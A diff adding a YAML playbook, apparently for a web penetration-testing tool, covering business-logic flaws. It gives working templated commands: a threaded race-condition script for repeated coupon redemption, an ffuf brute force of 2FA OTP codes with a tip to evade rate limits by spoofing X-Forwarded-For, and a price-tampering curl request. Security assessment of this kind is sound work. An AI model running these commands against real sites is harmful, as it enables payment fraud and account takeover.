@@ -1,0 +1,61 @@
+id: business-logic
+name: Business Logic Vulnerabilities & Race Conditions
+category: web
+description: Advanced assessment methodology for business logic flaws, race conditions (time-of-check to time-of-use), payment and price manipulation, multi-step workflow bypasses, and 2FA authentication flaws.
+port_triggers:
+  - 80
+  - 443
+  - 8080
+  - 8443
+service_triggers:
+  - http
+  - https
+  - web
+tags:
+  - business-logic
+  - race-conditions
+  - 2fa-bypass
+  - price-manipulation
+  - workflow-bypass
+steps:
+  - id: logic-race-conditions-turbo
+    title: Race Condition / Concurrency Testing (Turbo Intruder)
+    phase: exploitation
+    purpose: Send concurrent HTTP requests synchronized to the exact same millisecond using HTTP/2 multiplexing or TCP packet alignment to exploit race windows (e.g. redeeming coupon multiple times or double spending).
+    command: "python3 -c \"import requests, threading\ndef req(): requests.post('http://{{TARGET}}:{{PORT|80}}/api/redeem', json={'code':'DISCOUNT2026'}, headers={'Cookie':'{{SESSION_COOKIE}}'})\nthreads = [threading.Thread(target=req) for _ in range(30)]\nfor t in threads: t.start()\nfor t in threads: t.join()\""
+    expected_output:
+      - '[+] Multiple requests succeeded with 200 OK before state change was locked!'
+    common_mistakes:
+      - For best results with sub-millisecond precision, use Burp Suite Turbo Intruder single-packet attack.
+    if_success: Race condition validated! Balances or limits bypassed via simultaneous requests.
+    if_failure: Backend implements atomic database transactions (SELECT FOR UPDATE) or distributed locks.
+    references:
+      - https://portswigger.net/web-security/race-conditions
+
+  - id: logic-2fa-otp-bruteforce
+    title: Two-Factor Authentication (2FA) OTP Bypass & Spraying
+    phase: exploitation
+    purpose: Test for missing rate-limiting on 4-to-6 digit 2FA/OTP verification codes, response manipulation, or direct endpoint forced browsing.
+    command: "ffuf -u http://{{TARGET}}:{{PORT|80}}/verify-2fa -X POST -H 'Content-Type: application/json' -H 'Cookie: {{SESSION_COOKIE}}' -d '{\"otp\":\"FUZZ\"}' -w <(seq -w 0000 9999) -mc 200,302 -t 50"
+    expected_output:
+      - '[302] OTP: 4892 -> Redirect /dashboard'
+    common_mistakes:
+      - "If rate limiting is enforced per IP, try headers X-Forwarded-For: 127.0.0.1 or rotate IP addresses."
+    if_success: 2FA bypassed! Full account takeover completed without user authenticator device.
+    if_failure: Rate limiting blocks after 5 attempts. Test for response manipulation in Burp Proxy.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/2fa-bypass
+
+  - id: logic-parameter-price-tampering
+    title: Price & Negative Quantity Manipulation
+    phase: exploitation
+    purpose: Tamper with e-commerce parameters to induce business calculation errors or checkout for free.
+    command: "curl -s -X POST http://{{TARGET}}:{{PORT|80}}/cart/add -H 'Content-Type: application/json' -H 'Cookie: {{SESSION_COOKIE}}' -d '{\"item_id\": 42, \"price\": 0.01, \"quantity\": 1}'"
+    expected_output:
+      - '{"status": "success", "total_price": 0.01}'
+    common_mistakes:
+      - Test array parameters, negative quantities (quantity -1), and currency mismatches.
+    if_success: Server trusted client-side pricing or accepted negative numbers!
+    if_failure: Price verified against server database. Test coupon stacking logic.
+    references:
+      - https://portswigger.net/web-security/logic-flaws
